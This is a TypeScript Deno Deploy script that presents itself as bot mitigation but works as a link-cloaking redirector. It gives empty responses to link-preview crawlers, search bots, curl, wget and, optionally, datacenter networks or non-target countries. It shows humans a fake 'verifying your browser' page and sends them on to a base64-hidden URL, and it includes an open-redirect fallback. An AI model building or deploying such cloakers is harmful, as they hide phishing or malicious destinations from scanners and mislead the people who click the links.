// main.ts - V10 Hybrid (legitimate bot mitigation + human challenge)
// - Deno Deploy compatible (export default { fetch })
// - Blocks common preview bots, HEAD requests, datacenter ASN option
// - Rate-limits per IP (in-memory, ephemeral)
// - Lightweight JS challenge that sets an HttpOnly cookie and redirects
// - Base64 encoded redirect URL (hides plain URL in source)

const REDIRECT_B64 = "aHR0cHM6Ly9nb29nbGUuY29t"; // base64 of your final URL
const COOKIE_NAME = "v10_human";
const COOKIE_MAX_AGE = 60 * 60 * 6; // 6 hours
const RATE_WINDOW_MS = 60 * 1000; // 1 minute
const RATE_MAX = 40; // max requests per window per IP

// small list of common preview scanners / bots
const botUaSubstrings = [
  "facebookexternalhit", "facebot", "whatsapp", "twitterbot",
  "telegram", "discord", "linkedinbot", "slackbot",
  "curl", "wget", "python-requests", "httpclient", "preview",
  "bitlybot", "pinterest", "applebot", "bingbot", "googlebot"
];

// optional ASN blocklist (datacenter/clouds) — keep or prune for your use
const blockAsns = [ /* e.g. "AS14618", "AS15169" */ ];

// optional allowed countries (ISO2). Empty = allow all.
const allowedCountries: string[] = []; // e.g. ["NG")

// in-memory stores (ephemeral on edge)
const ipMap = new Map<string, { count: number; start: number }>();

function parseCookies(cookieHeader = "") {
  const c: Record<string, string> = {};
  if (!cookieHeader) return c;
  for (const pair of cookieHeader.split(";")) {
    const [k, ...v] = pair.trim().split("=");
    if (!k) continue;
    c[k] = decodeURIComponent(v.join("="));
  }
  return c;
}

function isBotUa(ua: string | null) {
  if (!ua) return true;
  const low = ua.toLowerCase();
  return botUaSubstrings.some((s) => low.includes(s));
}

function getClientIp(req: Request) {
  const h = req.headers;
  const xff = h.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  // Deno Deploy provides cf info; fallbacks included
  return (h.get("cf-connecting-ip") || h.get("x-real-ip") || "unknown");
}

function rateLimit(ip: string) {
  const now = Date.now();
  const rec = ipMap.get(ip);
  if (!rec || now - rec.start > RATE_WINDOW_MS) {
    ipMap.set(ip, { count: 1, start: now });
    return;
  }
  rec.count++;
  if (rec.count > RATE_MAX) throw new Error("rate_limited");
  ipMap.set(ip, rec);
}

function isBlockedAsn(req: Request) {
  if (blockAsns.length === 0) return false;
  const cf = (req as any).cf;
  if (!cf || !cf.asn) return false;
  return blockAsns.includes("AS" + cf.asn);
}

function isBlockedCountry(req: Request) {
  if (!allowedCountries || allowedCountries.length === 0) return false;
  const cf = (req as any).cf;
  if (!cf || !cf.country) return false;
  return !allowedCountries.includes(cf.country);
}

function serveChallengeHtml(encodedRedirectB64: string, tokenValue: string) {
  // small, compatible HTML that sets cookie via HTTP header is preferred, but
  // for broad compatibility we set cookie via JS and then use location replace.
  // This avoids issues with Response.redirect not allowing Set-Cookie in some flows.
  return `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying…</title>
<style>body{font-family:system-ui,Arial,Helvetica,sans-serif;margin:0;padding:40px;text-align:center;color:#222}</style>
</head>
<body>
  <h3>One more quick step</h3>
  <p>Please wait — verifying your browser.</p>
  <button id="b" style="padding:8px 12px;border-radius:6px;margin-top:12px">Continue</button>
<script>
(function(){
  const redirectB64 = "${encodedRedirectB64}";
  // we set a cookie via JS for compatibility across edge platforms
  function setCookie(name, value, maxAge){
    document.cookie = name + "=" + value + "; path=/; max-age=" + maxAge + "; samesite=lax";
  }
  // prefer to auto-proceed but allow button for slower devices
  let triggered = false;
  function proceed(){
    if (triggered) return;
    triggered = true;
    setCookie("${COOKIE_NAME}", "${tokenValue}", ${COOKIE_MAX_AGE});
    try {
      const url = atob(redirectB64);
      location.replace(url);
    } catch (e) {
      // fallback: append simple param and let server redirect
      location.replace(location.pathname + "?ok=1&r=" + redirectB64);
    }
  }
  document.getElementById("b").addEventListener("click", proceed);
  // short delay to let JS run on slow devices
  setTimeout(proceed, 500);
})();
</script>
<noscript><p>Please enable JavaScript to continue.</p></noscript>
</body>
</html>`;
}

// helper to generate random token string (simple, not crypto-critical)
function rndToken(len = 24) {
  const arr = new Uint8Array(len);
  crypto.getRandomValues(arr);
  return Array.from(arr).map(n => n.toString(36).padStart(2,"0")).join("").slice(0,len);
}

export default {
  async fetch(req: Request): Promise<Response> {
    try {
      // basic quick checks
      const ua = req.headers.get("user-agent") || "";
      const method = req.method;
      const url = new URL(req.url);
      const ip = getClientIp(req);

      rateLimit(ip);

      // block HEAD requests (commonly used by preview scanners)
      if (method === "HEAD") return new Response("", { status: 204 });

      // block obvious preview user agents
      if (isBotUa(ua)) return new Response("", { status: 204 });

      // optional ASN / country checks
      if (isBlockedAsn(req)) return new Response("", { status: 204 });
      if (isBlockedCountry(req)) return new Response("", { status: 204 });

      // If a cookie already exists and looks valid, redirect to final URL
      const cookies = parseCookies(req.headers.get("cookie") || "");
      if (cookies[COOKIE_NAME]) {
        // (optional) rudimentary token-format check
        if (cookies[COOKIE_NAME].length >= 12) {
          try {
            const target = atob(REDIRECT_B64);
            return Response.redirect(target, 302);
          } catch {
            return new Response("", { status: 204 });
          }
        }
      }

      // If server-received client returned from fallback path (?ok=1&r=...)
      if (url.searchParams.has("ok") && url.searchParams.has("r")) {
        // accept this flow as fallback
        try {
          const r = atob(url.searchParams.get("r") || "");
          return Response.redirect(r, 302);
        } catch {
          return new Response("", { status: 204 });
        }
      }

      // Otherwise serve the lightweight challenge page
      const token = rndToken(24); // issued token (kept client-side as cookie)
      const html = serveChallengeHtml(REDIRECT_B64, token);
      return new Response(html, {
        status: 200,
        headers: {
          "content-type": "text/html; charset=utf-8",
          "cache-control": "no-store, no-cache, must-revalidate",
        },
      });

    } catch (err) {
      // rate limit or other error -> quiet fail (don't leak internals)
      if (String(err).includes("rate_limited")) {
        return new Response("", { status: 429 });
      }
      return new Response("Error", { status: 500 });
    }
  }
};
